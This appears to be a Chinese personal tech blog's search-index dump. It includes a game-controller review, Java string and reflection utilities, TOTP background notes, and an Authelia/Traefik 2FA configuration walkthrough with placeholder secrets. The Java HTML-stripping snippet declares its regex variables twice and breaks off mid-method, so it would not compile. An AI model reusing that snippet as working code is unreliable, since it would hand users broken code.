搖桿開箱紀錄","uri":"/blog/posts/Switch-pro-%E6%90%96%E6%A1%BF-%E5%92%8C-%E8%89%AF%E5%80%BC%E5%9B%9B%E4%BB%A3-%E6%90%96%E6%A1%BF%E9%96%8B%E7%AE%B1%E7%B4%80%E9%8C%84/"},{"categories":["隨意開箱"],"content":"良值四代搖桿 有 NFC 刷 amiibo 、有Swith 主機喚醒，比較特別的是有連點按鍵功能；目前沒有 HD 震動。台北地下街850~110x。網路最便宜可以看到780。但我這個從蝦皮買回來搖桿有壞掉(拔掉USB會馬上熄掉），雖然免費送修，但我覺的各位買的良值品質是不是有問題，我也不是很清楚，後來一個禮拜後賣家幫我更換電池就正常使用。所以我建議買的時候一定要測試。 ","date":"2022-02-13","objectID":"/blog/posts/Switch-pro-%E6%90%96%E6%A1%BF-%E5%92%8C-%E8%89%AF%E5%80%BC%E5%9B%9B%E4%BB%A3-%E6%90%96%E6%A1%BF%E9%96%8B%E7%AE%B1%E7%B4%80%E9%8C%84/:1:0","tags":["switch","搖桿"],"title":"Switch pro 搖桿 和 良值四代 搖桿開箱紀錄","uri":"/blog/posts/Switch-pro-%E6%90%96%E6%A1%BF-%E5%92%8C-%E8%89%AF%E5%80%BC%E5%9B%9B%E4%BB%A3-%E6%90%96%E6%A1%BF%E9%96%8B%E7%AE%B1%E7%B4%80%E9%8C%84/"},{"categories":["隨意開箱"],"content":"功能教學 參考【心得】Switch 良值連發手把 使用說明 (以動物森友會舉例) @NS / Nintendo Switch 哈啦板 - 巴哈姆特文章，原本想看說明書，但是說明書不見了。 連點模式有兩種 按住中間按鍵+你想要連點按鍵(同時按)，會進入連點模式1，再按住中間按鍵+你想要連點按鍵(同時按)，會進入連點模式2，再按住中間按鍵+你想要連點按鍵(同時按)會回一般模式。我講的太白話用圖表示，親自測試很快就能理解。 flowchart LR 一般模式-- \"中間按鍵+你想要連點按鍵(同時按)\" --\u003e模式1-- \"中間按鍵+你想要連點按鍵(同時按)\" --\u003e 模式2-- \"中間按鍵+你想要連點按鍵(同時按)\" --\u003e一般模式 震動 按著連發鍵+左搖桿上下 可以四段切換震動大小 (100% 70% 30% 0%) 初次配對新主機 (帶去朋友家玩時用的到) 在更改拿法畫面中 長壓手把後面的小鈕 第二次以後配對 在更改拿法畫面中 按任意鍵 等待藍芽配對 遠端喚醒 拿配對過的手把 長壓home鍵 閃燈即可放開 有線模式 (主要用途是插耳機?) 沒測試 但應該只要插上 有連線 設定有開啟有線模式 應該就可以了 充電注意事項 說明書說不可使用typeC快充(QC/PD) 包括NS原廠的typeC變壓器 只能用\u003c=10W的舊式快充 這個部份等我過保再來測試看看 震動也滿一般，有用過一般搖桿都還能接受。覺得Switch Pro 搖桿貴的人，可以考慮這隻。後來，我玩馬力歐 3D 世界發現，HD震動的差別，不過大部分遊玩還是可以用良值還是可以玩，如薩爾達荒野之息沒支援 HD 震動。 ","date":"2022-02-13","objectID":"/blog/posts/Switch-pro-%E6%90%96%E6%A1%BF-%E5%92%8C-%E8%89%AF%E5%80%BC%E5%9B%9B%E4%BB%A3-%E6%90%96%E6%A1%BF%E9%96%8B%E7%AE%B1%E7%B4%80%E9%8C%84/:1:1","tags":["switch","搖桿"],"title":"Switch pro 搖桿 和 良值四代 搖桿開箱紀錄","uri":"/blog/posts/Switch-pro-%E6%90%96%E6%A1%BF-%E5%92%8C-%E8%89%AF%E5%80%BC%E5%9B%9B%E4%BB%A3-%E6%90%96%E6%A1%BF%E9%96%8B%E7%AE%B1%E7%B4%80%E9%8C%84/"},{"categories":["隨意開箱"],"content":"Switch Pro 搖桿 台北地下街價格 1990 ~ 2090之間。雖然大家講 HD 震動，我一開始以為震動很猛。但我後來發現震動很小，但後來玩支援 HD 震動遊戲才感受到差別，我玩瑪莉歐 3D 世界才感受到細微連續震動，這跟以往遊玩體驗不一樣。 ","date":"2022-02-13","objectID":"/blog/posts/Switch-pro-%E6%90%96%E6%A1%BF-%E5%92%8C-%E8%89%AF%E5%80%BC%E5%9B%9B%E4%BB%A3-%E6%90%96%E6%A1%BF%E9%96%8B%E7%AE%B1%E7%B4%80%E9%8C%84/:2:0","tags":["switch","搖桿"],"title":"Switch pro 搖桿 和 良值四代 搖桿開箱紀錄","uri":"/blog/posts/Switch-pro-%E6%90%96%E6%A1%BF-%E5%92%8C-%E8%89%AF%E5%80%BC%E5%9B%9B%E4%BB%A3-%E6%90%96%E6%A1%BF%E9%96%8B%E7%AE%B1%E7%B4%80%E9%8C%84/"},{"categories":["隨意開箱"],"content":"小心有山寨搖桿 不要貪小便宜，盜版目前得知震動很大、沒有NFC功能、Switch 喚醒主機。但未來誰知道會不會有假的。 【任天堂】pro手柄，高仿和正品的震动想要持续不断的嗨还是要正品啊_哔哩哔哩_bilibili ","date":"2022-02-13","objectID":"/blog/posts/Switch-pro-%E6%90%96%E6%A1%BF-%E5%92%8C-%E8%89%AF%E5%80%BC%E5%9B%9B%E4%BB%A3-%E6%90%96%E6%A1%BF%E9%96%8B%E7%AE%B1%E7%B4%80%E9%8C%84/:3:0","tags":["switch","搖桿"],"title":"Switch pro 搖桿 和 良值四代 搖桿開箱紀錄","uri":"/blog/posts/Switch-pro-%E6%90%96%E6%A1%BF-%E5%92%8C-%E8%89%AF%E5%80%BC%E5%9B%9B%E4%BB%A3-%E6%90%96%E6%A1%BF%E9%96%8B%E7%AE%B1%E7%B4%80%E9%8C%84/"},{"categories":["隨意開箱"],"content":"結論 在乎震動的買 Switch Pro，在乎 CP 值可以買良值搖桿，但兩者不比較錢還是比較推薦買Switch Pro搖桿，這樣享受原有遊戲HD震動。 下面做個簡單比較，主要偏自己主觀想法。 良值4代 Switch Pro amobii o o 震動 o o HD震動 x o 無線 o o PC遊玩 o o 良值4代 Switch Pro 優點 1. CP值高2. 有耳機孔(但我用不到吧?) 有HD震動 缺點 搖桿是塑膠感很重，不過Switch Pro也差不多 1. 很貴2. 手感比良值4代好一點 ","date":"2022-02-13","objectID":"/blog/posts/Switch-pro-%E6%90%96%E6%A1%BF-%E5%92%8C-%E8%89%AF%E5%80%BC%E5%9B%9B%E4%BB%A3-%E6%90%96%E6%A1%BF%E9%96%8B%E7%AE%B1%E7%B4%80%E9%8C%84/:4:0","tags":["switch","搖桿"],"title":"Switch pro 搖桿 和 良值四代 搖桿開箱紀錄","uri":"/blog/posts/Switch-pro-%E6%90%96%E6%A1%BF-%E5%92%8C-%E8%89%AF%E5%80%BC%E5%9B%9B%E4%BB%A3-%E6%90%96%E6%A1%BF%E9%96%8B%E7%AE%B1%E7%B4%80%E9%8C%84/"},{"categories":["隨意開箱"],"content":"照片 ","date":"2022-02-13","objectID":"/blog/posts/Switch-pro-%E6%90%96%E6%A1%BF-%E5%92%8C-%E8%89%AF%E5%80%BC%E5%9B%9B%E4%BB%A3-%E6%90%96%E6%A1%BF%E9%96%8B%E7%AE%B1%E7%B4%80%E9%8C%84/:5:0","tags":["switch","搖桿"],"title":"Switch pro 搖桿 和 良值四代 搖桿開箱紀錄","uri":"/blog/posts/Switch-pro-%E6%90%96%E6%A1%BF-%E5%92%8C-%E8%89%AF%E5%80%BC%E5%9B%9B%E4%BB%A3-%E6%90%96%E6%A1%BF%E9%96%8B%E7%AE%B1%E7%B4%80%E9%8C%84/"},{"categories":["隨意開箱"],"content":"良質 ","date":"2022-02-13","objectID":"/blog/posts/Switch-pro-%E6%90%96%E6%A1%BF-%E5%92%8C-%E8%89%AF%E5%80%BC%E5%9B%9B%E4%BB%A3-%E6%90%96%E6%A1%BF%E9%96%8B%E7%AE%B1%E7%B4%80%E9%8C%84/:5:1","tags":["switch","搖桿"],"title":"Switch pro 搖桿 和 良值四代 搖桿開箱紀錄","uri":"/blog/posts/Switch-pro-%E6%90%96%E6%A1%BF-%E5%92%8C-%E8%89%AF%E5%80%BC%E5%9B%9B%E4%BB%A3-%E6%90%96%E6%A1%BF%E9%96%8B%E7%AE%B1%E7%B4%80%E9%8C%84/"},{"categories":["隨意開箱"],"content":"Switch Pro 可以看出 Switch Pro A 比較出來…，操作上都還好，不知道是不是故意的…。 ","date":"2022-02-13","objectID":"/blog/posts/Switch-pro-%E6%90%96%E6%A1%BF-%E5%92%8C-%E8%89%AF%E5%80%BC%E5%9B%9B%E4%BB%A3-%E6%90%96%E6%A1%BF%E9%96%8B%E7%AE%B1%E7%B4%80%E9%8C%84/:5:2","tags":["switch","搖桿"],"title":"Switch pro 搖桿 和 良值四代 搖桿開箱紀錄","uri":"/blog/posts/Switch-pro-%E6%90%96%E6%A1%BF-%E5%92%8C-%E8%89%AF%E5%80%BC%E5%9B%9B%E4%BB%A3-%E6%90%96%E6%A1%BF%E9%96%8B%E7%AE%B1%E7%B4%80%E9%8C%84/"},{"categories":["Java"],"content":"網路上找的方法，留一下紀錄。 java 下劃線轉駝峰 - IT閱讀 /** * 將駝峰式命名的字串轉換為下劃線大寫方式。如果轉換前的駝峰式命名的字串為空，則返回空字串。\u003c/br\u003e * 例如：HelloWorld-\u003eHELLO_WORLD * @param name 轉換前的駝峰式命名的字串 * @return 轉換後下劃線大寫方式命名的字串 */ public static String underscoreName(String name) { StringBuilder result = new StringBuilder(); if (name != null \u0026\u0026 name.length() \u003e 0) { // 將第一個字元處理成大寫 result.append(name.substring(0, 1).toUpperCase()); // 迴圈處理其餘字元 for (int i = 1; i \u003c name.length(); i++) { String s = name.substring(i, i + 1); // 在大寫字母前新增下劃線 if (s.equals(s.toUpperCase()) \u0026\u0026 !Character.isDigit(s.charAt(0))) { result.append(\"_\"); } // 其他字元直接轉成大寫 result.append(s.toUpperCase()); } } return result.toString(); } /** * 將下劃線大寫方式命名的字串轉換為駝峰式。如果轉換前的下劃線大寫方式命名的字串為空，則返回空字串。\u003c/br\u003e * 例如：HELLO_WORLD-\u003eHelloWorld * @param name 轉換前的下劃線大寫方式命名的字串 * @return 轉換後的駝峰式命名的字串 */ public static String camelName(String name) { StringBuilder result = new StringBuilder(); // 快速檢查 if (name == null || name.isEmpty()) { // 沒必要轉換 return \"\"; } else if (!name.contains(\"_\")) { // 不含下劃線，僅將首字母小寫 return name.substring(0, 1).toLowerCase() + name.substring(1); } // 用下劃線將原始字串分割 String camels[] = name.split(\"_\"); for (String camel : camels) { // 跳過原始字串中開頭、結尾的下換線或雙重下劃線 if (camel.isEmpty()) { continue; } // 處理真正的駝峰片段 if (result.length() == 0) { // 第一個駝峰片段，全部字母都小寫 result.append(camel.toLowerCase()); } else { // 其他的駝峰片段，首字母大寫 result.append(camel.substring(0, 1).toUpperCase()); result.append(camel.substring(1).toLowerCase()); } } return result.toString(); } ","date":"2022-02-13","objectID":"/blog/posts/%E8%BD%89-Java-%E5%BA%95%E7%B7%9A%E5%91%BD%E5%90%8D%E8%BD%89%E9%A7%9D%E5%B3%B0/:0:0","tags":["java"],"title":"[轉]Java 底線命名轉駝峰","uri":"/blog/posts/%E8%BD%89-Java-%E5%BA%95%E7%B7%9A%E5%91%BD%E5%90%8D%E8%BD%89%E9%A7%9D%E5%B3%B0/"},{"categories":["Java"],"content":"網路上找的 Trim Html 程式方法。 import java.util.regex.Matcher; import java.util.regex.Pattern; public class HTMLSpirit{ public static String delHTMLTag(String htmlStr){ String regEx_script=\"\u003cscript[^\u003e]*?\u003e[\\\\s\\\\S]*?\u003c\\\\/script\u003e\"; //定義script的正則表示式 String regEx_style=\"\u003cstyle[^\u003e]*?\u003e[\\\\s\\\\S]*?\u003c\\\\/style\u003e\"; //定義style的正則表示式 String regEx_html=\"\u003c[^\u003e]+\u003e\"; //定義HTML標籤的正則表示式 String regEx_script=\"[\u003c＜]script[^\u003e＞]*?\u003e[\\\\s\\\\S]*?[\u003c＜]\\\\/script[\u003e＞]\"; //定義script的正則表示式 String regEx_style=\"[\u003c＜]style[^\u003e＞]*?\u003e[\\\\s\\\\S]*?[\u003c＜]\\\\/style[\u003e＞]\"; //定義style的正則表示式 String regEx_html=\"[\u003c＜][^\u003e＞]+[\u003e＞]\"; //定義HTML標籤的正則表示式 String regEx_space=\"\\\\s\"; // 去除空白 Pattern p_script=Pattern.compile(regEx_script,Pattern.CASE_INSENSITIVE); Matcher m_script=p_script.matcher(htmlStr); htmlStr=m_script.replaceAll(\"\"); //過濾script標籤 Pattern p_style=Pattern.compile(regEx_style,Pattern.CASE_INSENSITIVE); Matcher m_style=p_style.matcher(htmlStr); ","date":"2022-02-13","objectID":"/blog/posts/Java-%E5%AD%97%E4%B8%B2%E6%BF%BE%E6%8E%89HTML/:0:0","tags":["java"],"title":"Java 字串濾掉HTML","uri":"/blog/posts/Java-%E5%AD%97%E4%B8%B2%E6%BF%BE%E6%8E%89HTML/"},{"categories":["Java"],"content":"程式整理 ","date":"2022-02-13","objectID":"/blog/posts/Java-%E6%98%A0%E5%B0%84%E6%95%B4%E7%90%86%E6%95%B4%E7%90%86/:0:0","tags":["java"],"title":"Java 映射整理整理","uri":"/blog/posts/Java-%E6%98%A0%E5%B0%84%E6%95%B4%E7%90%86%E6%95%B4%E7%90%86/"},{"categories":["Java"],"content":"範例 ","date":"2022-02-13","objectID":"/blog/posts/Java-%E6%98%A0%E5%B0%84%E6%95%B4%E7%90%86%E6%95%B4%E7%90%86/:1:0","tags":["java"],"title":"Java 映射整理整理","uri":"/blog/posts/Java-%E6%98%A0%E5%B0%84%E6%95%B4%E7%90%86%E6%95%B4%E7%90%86/"},{"categories":["Java"],"content":"假Bean(含有Map) to 真Bean 靜態(static)方法回傳泛型 public static void copyDataObjectToBean(DataObject src, DataObject dest) throws IntrospectionException, IllegalAccessException, InvocationTargetException, NoSuchMethodException { Map map = src.toMap(); Set set = map.keySet(); Iterator\u003cString\u003e it = set.iterator(); PropertyDescriptor[] propertiesStr = PropertyUtils.getPropertyDescriptors(dest); System.out.println(\"Map:\"+map); for(PropertyDescriptor propertyDescriptor : Introspector.getBeanInfo(dest.getClass()).getPropertyDescriptors()){ // propertyEditor.getReadMethod() exposes the getter // btw, this may be null if you have a write-only property Method method = propertyDescriptor.getReadMethod(); String methodStr = propertyDescriptor.getReadMethod().getName().substring(3); String beanKey = propertyDescriptor.getReadMethod().getName().substring(3).toUpperCase(); String name = underscoreName(propertyDescriptor.getName()); if(!map.containsKey(name)) { continue; } String value = MapUtils.getString(map, name); // System.out.println(\"beanKey:\" + propertyDescriptor.getName()); BeanUtils.setProperty(dest, propertyDescriptor.getName(), value); } } public static \u003cT extends DataObject\u003e T copyDataObjectToBean(DataObject src, Class\u003cT\u003e clazz) throws IntrospectionException, IllegalAccessException, InvocationTargetException, NoSuchMethodException, InstantiationException { Map map = src.toMap(); Set set = map.keySet(); Iterator\u003cString\u003e it = set.iterator(); DataObject dest = clazz.newInstance(); PropertyDescriptor[] propertiesStr = PropertyUtils.getPropertyDescriptors(dest); System.out.println(\"Map:\"+map); for(PropertyDescriptor propertyDescriptor : Introspector.getBeanInfo(dest.getClass()).getPropertyDescriptors()){ // propertyEditor.getReadMethod() exposes the getter // btw, this may be null if you have a write-only property Method method = propertyDescriptor.getReadMethod(); String methodStr = propertyDescriptor.getReadMethod().getName().substring(3); String beanKey = propertyDescriptor.getReadMethod().getName().substring(3).toUpperCase(); String name = underscoreName(propertyDescriptor.getName()); if(!map.containsKey(name)) { continue; } String value = MapUtils.getString(map, name); // System.out.println(\"beanKey:\" + propertyDescriptor.getName()); BeanUtils.setProperty(dest, propertyDescriptor.getName(), value); } return (T) dest; } /** * 將駝峰式命名的字串轉換為下劃線大寫方式。如果轉換前的駝峰式命名的字串為空，則返回空字串。\u003c/br\u003e * 例如：HelloWorld-\u003eHELLO_WORLD * @param name 轉換前的駝峰式命名的字串 * @return 轉換後下劃線大寫方式命名的字串 */ public static String underscoreName(String name) { StringBuilder result = new StringBuilder(); if (name != null \u0026\u0026 name.length() \u003e 0) { // 將第一個字元處理成大寫 result.append(name.substring(0, 1).toUpperCase()); // 迴圈處理其餘字元 for (int i = 1; i \u003c name.length(); i++) { String s = name.substring(i, i + 1); // 在大寫字母前新增下劃線 if (s.equals(s.toUpperCase()) \u0026\u0026 !Character.isDigit(s.charAt(0))) { result.append(\"_\"); } // 其他字元直接轉成大寫 result.append(s.toUpperCase()); } } return result.toString(); } /** * 將下劃線大寫方式命名的字串轉換為駝峰式。如果轉換前的下劃線大寫方式命名的字串為空，則返回空字串。\u003c/br\u003e * 例如：HELLO_WORLD-\u003eHelloWorld * @param name 轉換前的下劃線大寫方式命名的字串 * @return 轉換後的駝峰式命名的字串 */ public static String camelName(String name) { StringBuilder result = new StringBuilder(); // 快速檢查 if (name == null || name.isEmpty()) { // 沒必要轉換 return \"\"; } else if (!name.contains(\"_\")) { // 不含下劃線，僅將首字母小寫 return name.substring(0, 1).toLowerCase() + name.substring(1); } // 用下劃線將原始字串分割 String camels[] = name.split(\"_\"); for (String camel : camels) { // 跳過原始字串中開頭、結尾的下換線或雙重下劃線 if (camel.isEmpty()) { continue; } // 處理真正的駝峰片段 if (result.length() == 0) { // 第一個駝峰片段，全部字母都小寫 result.append(camel.toLowerCase()); } else { // 其他的駝峰片段，首字母大寫 result.append(camel.substring(0, 1).toUpperCase()); result.append(camel.substring(1).toLowerCase()); } } return result.toString(); } ","date":"2022-02-13","objectID":"/blog/posts/Java-%E6%98%A0%E5%B0%84%E6%95%B4%E7%90%86%E6%95%B4%E7%90%86/:1:1","tags":["java"],"title":"Java 映射整理整理","uri":"/blog/posts/Java-%E6%98%A0%E5%B0%84%E6%95%B4%E7%90%86%E6%95%B4%E7%90%86/"},{"categories":["Java"],"content":"網路範例 for(PropertyDescriptor propertyDescriptor : Introspector.getBeanInfo(yourClass).getPropertyDescriptors()){ // propertyEditor.getReadMethod() exposes the getter // btw, this may be null if you have a write-only property System.out.println(propertyDescriptor.getReadMethod()); } [Solved] Java Reflection: How can I get the all getter methods of a java class and invoke them - Code Redirect ","date":"2022-02-13","objectID":"/blog/posts/Java-%E6%98%A0%E5%B0%84%E6%95%B4%E7%90%86%E6%95%B4%E7%90%86/:1:2","tags":["java"],"title":"Java 映射整理整理","uri":"/blog/posts/Java-%E6%98%A0%E5%B0%84%E6%95%B4%E7%90%86%E6%95%B4%E7%90%86/"},{"categories":["Java"],"content":"理論整理 Spring的BeanUtils實現忽略大小寫的copyProperties（）方法！ - 台部落 关于属性描述符PropertyDescriptor - 猫叔的博客 | MySelf [详叙BeanWrapper和PropertyDescriptor - YourBatman - 博客园](https://www.cnblogs.com/yourbatman/p/11212258.html 小信豬的原始部落: Java 學習筆記 (10) - Reflection 菜鳥工程師 肉豬: Java 使用Class.forName().newinstance()產生物件實例。 ","date":"2022-02-13","objectID":"/blog/posts/Java-%E6%98%A0%E5%B0%84%E6%95%B4%E7%90%86%E6%95%B4%E7%90%86/:2:0","tags":["java"],"title":"Java 映射整理整理","uri":"/blog/posts/Java-%E6%98%A0%E5%B0%84%E6%95%B4%E7%90%86%E6%95%B4%E7%90%86/"},{"categories":["程式心法"],"content":"最近公司VPN用 2FA 驗證，用 Google Authenticator，原本想說這個是透過網路，連 Google 伺服器去取密碼，結果手機開飛航模式發現密碼還是可以產生出來，就激發我的興趣，簡單整理資料。 ","date":"2022-02-13","objectID":"/blog/posts/two-factor-%E7%9B%B8%E9%97%9C%E7%9F%A5%E8%AD%98%E5%92%8C%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/:0:0","tags":["2fa"],"title":"two factor 相關知識和工具整理","uri":"/blog/posts/two-factor-%E7%9B%B8%E9%97%9C%E7%9F%A5%E8%AD%98%E5%92%8C%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/"},{"categories":["程式心法"],"content":"原理 [OneTimePassword] 一次性密碼演算法：簡介HOTP、TOTP和Google Authenticator | 全端開發人員天梯 演算法: HOTP(計數器) TOTP(時間) 配置 HOTP 一次性密码机制 - IBM 文档 QrCode: otpauth://totp/example.com:john?algorithm=SHA1\u0026digits=6\u0026issuer=example.com\u0026period=30\u0026secret=EI6UXYUKSLSMKVQTTRS474MHUTFV4UPTANXYOZV3IME7K7GQ3UDA ","date":"2022-02-13","objectID":"/blog/posts/two-factor-%E7%9B%B8%E9%97%9C%E7%9F%A5%E8%AD%98%E5%92%8C%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/:1:0","tags":["2fa"],"title":"two factor 相關知識和工具整理","uri":"/blog/posts/two-factor-%E7%9B%B8%E9%97%9C%E7%9F%A5%E8%AD%98%E5%92%8C%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/"},{"categories":["程式心法"],"content":"相關工具 後來發現除了用手機APP，其實拿到金鑰也能產生，這邊就不研究了。有回來操作再補。 ssh - Is there a command line two-factor authentication verification code generator? - Server Fault 2016台網中心電子報 Your Time-based One time passwords from your terminal | by Jean-Thierry Bonhomme | Medium totp-cli | TOTP CLI tool written in Go. ","date":"2022-02-13","objectID":"/blog/posts/two-factor-%E7%9B%B8%E9%97%9C%E7%9F%A5%E8%AD%98%E5%92%8C%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/:2:0","tags":["2fa"],"title":"two factor 相關知識和工具整理","uri":"/blog/posts/two-factor-%E7%9B%B8%E9%97%9C%E7%9F%A5%E8%AD%98%E5%92%8C%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/"},{"categories":["程式心法"],"content":"我家本身有用 Traefik，想讓 traefik 可以做 SSO 控制。 ","date":"2022-02-13","objectID":"/blog/posts/Authelia-%E8%A8%AD%E5%AE%9A%E5%92%8C-%E5%AF%A6%E4%BD%9C-2FA-%E7%99%BB%E5%85%A5%E9%A9%97%E8%AD%89/:0:0","tags":["2fa","sso","authelia"],"title":"Authelia 設定和 實作 2FA 登入驗證","uri":"/blog/posts/Authelia-%E8%A8%AD%E5%AE%9A%E5%92%8C-%E5%AF%A6%E4%BD%9C-2FA-%E7%99%BB%E5%85%A5%E9%A9%97%E8%AD%89/"},{"categories":["程式心法"],"content":"官方簡單實作 需使用root帳號，參考Deployment - Lite - Authelia。 git clone https://github.com/authelia/authelia.git cd authelia/examples/compose/local # 這邊我是使用local git checkout $(git describe --tags `git rev-list --tags --max-count=1`)# 或者用master也可以 sudo ./setup.sh # 他會加 hostname 特定網域如: *.example.com 記得改 configuration.yml 裡面 encryption_key，參考:SQLite - Authelia 啟動可以會遇到全權限問題，可以參考: docker 設定 user 文章 我的設定 ","date":"2022-02-13","objectID":"/blog/posts/Authelia-%E8%A8%AD%E5%AE%9A%E5%92%8C-%E5%AF%A6%E4%BD%9C-2FA-%E7%99%BB%E5%85%A5%E9%A9%97%E8%AD%89/:1:0","tags":["2fa","sso","authelia"],"title":"Authelia 設定和 實作 2FA 登入驗證","uri":"/blog/posts/Authelia-%E8%A8%AD%E5%AE%9A%E5%92%8C-%E5%AF%A6%E4%BD%9C-2FA-%E7%99%BB%E5%85%A5%E9%A9%97%E8%AD%89/"},{"categories":["程式心法"],"content":"設定 2FA 設定上非常簡單，這邊小記重點，下面有範例看。 測試用 mail notifier: disable_startup_check: false filesystem: filename: /config/notification.txt 可以 less 查看 mail 內容。 Notifier - Authelia 產生 users_database.yml 的 hash密碼值 $(sudo docker run authelia/authelia authelia hash-password __你要加密的密碼__ | sed 's/Password hash: //g') 設定網路區域 access_control: networks: - name: internal # 設定區域網路 Range networks: - 10.0.0.0/8 - 172.16.0.0/12 - 192.168.0.0/18 ","date":"2022-02-13","objectID":"/blog/posts/Authelia-%E8%A8%AD%E5%AE%9A%E5%92%8C-%E5%AF%A6%E4%BD%9C-2FA-%E7%99%BB%E5%85%A5%E9%A9%97%E8%AD%89/:1:1","tags":["2fa","sso","authelia"],"title":"Authelia 設定和 實作 2FA 登入驗證","uri":"/blog/posts/Authelia-%E8%A8%AD%E5%AE%9A%E5%92%8C-%E5%AF%A6%E4%BD%9C-2FA-%E7%99%BB%E5%85%A5%E9%A9%97%E8%AD%89/"},{"categories":["程式心法"],"content":"運用在SERVER ","date":"2022-02-13","objectID":"/blog/posts/Authelia-%E8%A8%AD%E5%AE%9A%E5%92%8C-%E5%AF%A6%E4%BD%9C-2FA-%E7%99%BB%E5%85%A5%E9%A9%97%E8%AD%89/:2:0","tags":["2fa","sso","authelia"],"title":"Authelia 設定和 實作 2FA 登入驗證","uri":"/blog/posts/Authelia-%E8%A8%AD%E5%AE%9A%E5%92%8C-%E5%AF%A6%E4%BD%9C-2FA-%E7%99%BB%E5%85%A5%E9%A9%97%E8%AD%89/"},{"categories":["程式心法"],"content":"樹莓派安裝 官方有做 arm 版本。所以直接docker run 可以正常運行。我使用local版本，因為是在樹莓派關係，人數也沒有很多人在用，所以使用local版本。官方有lite,kubernetes 版本可以看。 ","date":"2022-02-13","objectID":"/blog/posts/Authelia-%E8%A8%AD%E5%AE%9A%E5%92%8C-%E5%AF%A6%E4%BD%9C-2FA-%E7%99%BB%E5%85%A5%E9%A9%97%E8%AD%89/:2:1","tags":["2fa","sso","authelia"],"title":"Authelia 設定和 實作 2FA 登入驗證","uri":"/blog/posts/Authelia-%E8%A8%AD%E5%AE%9A%E5%92%8C-%E5%AF%A6%E4%BD%9C-2FA-%E7%99%BB%E5%85%A5%E9%A9%97%E8%AD%89/"},{"categories":["程式心法"],"content":"程式參考設定 authelia/configuration.yml 設定 簡單記錄重點 改多欄位key 可針對區域網路做設定 rule 可設定多網域登入 --- jwt_secret: must_change_secret_key # 改變 default_redirection_url: https://public.xxxx.com.tw server: host: 0.0.0.0 port: 9091 log: level: debug totp: issuer: xxxx.org.tw # authentication 登入名稱 authentication_backend: file: path: /config/users_database.yml access_control: networks: - name: internal # 設定區域網路 Range networks: - 10.0.0.0/8 - 172.16.0.0/12 - 192.168.0.0/18 default_policy: deny rules: - domain: xxxxxx.com.tw # 設定網站規則 policy: bypass networks: - internal # 區域網路不做驗證 - domain: xxxxxx.com.tw # 設定網站規則 policy: two_factor # 雙重驗證 - domain: secure.xxxx.com.tw policy: one_factor # 密碼驗證 session: name: authelia_session secret: must_change_secret_key domain: xxxx.com.tw # Should match whatever your root protected domain is regulation: # 失敗次數會做 動作 max_retries: 3 # find_time: 120 # ban_time: 300 storage: encryption_key: must_change_secret_key# 須設定key local: path: /config/db.sqlite3 notifier: filesystem: filename: /config/notification.txt # 沒有SMTP，可以到這邊看 ... authelia/users_database.yml ```yaml users: user: displayname: \"user\" password: \"取代 hash值\" email: user@example.com groups: - admins - dev ","date":"2022-02-13","objectID":"/blog/posts/Authelia-%E8%A8%AD%E5%AE%9A%E5%92%8C-%E5%AF%A6%E4%BD%9C-2FA-%E7%99%BB%E5%85%A5%E9%A9%97%E8%AD%89/:2:2","tags":["2fa","sso","authelia"],"title":"Authelia 設定和 實作 2FA 登入驗證","uri":"/blog/posts/Authelia-%E8%A8%AD%E5%AE%9A%E5%92%8C-%E5%AF%A6%E4%BD%9C-2FA-%E7%99%BB%E5%85%A5%E9%A9%97%E8%AD%89/"},{"categories":["程式心法"],"content":"docker 設定 authelia version: '3.3' networks: traefik_network: external: true services: authelia: image: authelia/authelia container_name: authelia volumes: - ./authelia:/config networks: - traefik_network labels: - 'traefik.enable=true' - 'traefik.http.routers.authelia.rule=Host(`authelia.xxxxx.xxxxx.org`)' - 'traefik.http.routers.authelia.tls=true' - 'traefik.http.routers.authelia.tls.options=default' - 'traefik.http.middlewares.authelia.forwardauth.address=http://authelia:9091/api/verify?rd=https://authelia.xxxxx.xxxxx.org' - 'traefik.http.middlewares.authelia.forwardauth.trustForwardHeader=true' - 'traefik.http.middlewares.authelia.forwardauth.authResponseHeaders=Remote-User,Remote-Groups,Remote-Name,Remote-Email' expose: - 9091 restart: unless-stopped healthcheck: disable: true environment: - TZ=Asia/Taipei ","date":"2022-02-13","objectID":"/blog/posts/Authelia-%E8%A8%AD%E5%AE%9A%E5%92%8C-%E5%AF%A6%E4%BD%9C-2FA-%E7%99%BB%E5%85%A5%E9%A9%97%E8%AD%89/:2:3","tags":["2fa","sso","authelia"],"title":"Authelia 設定和 實作 2FA 登入驗證","uri":"/blog/posts/Authelia-%E8%A8%AD%E5%AE%9A%E5%92%8C-%E5%AF%A6%E4%BD%9C-2FA-%E7%99%BB%E5%85%A5%E9%A9%97%E8%AD%89/"},{"categories":["程式心法"],"content":"服務設定label 主要重點只有一個traefik.http.routers.ncp.middlewares=authelia@docker，請參考下面設定。 version: \"3\" services: nextcloudpi: # image: ownyourbits/nextcloudpi # 後來發現 nextcloudpi 有 nextcloudpi-armhf image image: ownyourbits/nextcloudpi-armhf command: \"192.168.1.202\" networks: - traefik_network labels: - \"traefik.backend=ncp\" - \"traefik.http.routers.ncp.rule=Host(`xxx.xxx.xxx.org`)\" - \"traefik.http.routers.ncp.tls=true\" - \"traefik.http.services.ncp.loadbalancer.server.port=80\" - 'traefik.http.routers.ncp.middlewares=authelia@docker' restart: always ports: #- \"1180:80\" # 暫時使用 #- \"11443:443\" # 暫時使用 - \"4443:4443\" volumes: - /media/USBdrive/ncp2:/data - /etc/localtime:/etc/localtime:ro environment: - \"UMASK=002\" networks: traefik_network: external: true ","date":"2022-02-13","objectID":"/blog/posts/Authelia-%E8%A8%AD%E5%AE%9A%E5%92%8C-%E5%AF%A6%E4%BD%9C-2FA-%E7%99%BB%E5%85%A5%E9%A9%97%E8%AD%89/:2:4","tags":["2fa","sso","authelia"],"title":"Authelia 設定和 實作 2FA 登入驗證","uri":"/blog/posts/Authelia-%E8%A8%AD%E5%AE%9A%E5%92%8C-%E5%AF%A6%E4%BD%9C-2FA-%E7%99%BB%E5%85%A5%E9%A9%97%E8%AD%89/"},{"categories":["程式心法"],"content":"最近找個 SSO 登入找有 2FA 登入驗證，要找資料不多，但查到相關軟體，就找出一大堆。所以先整理一下，以後要找直接回來看。 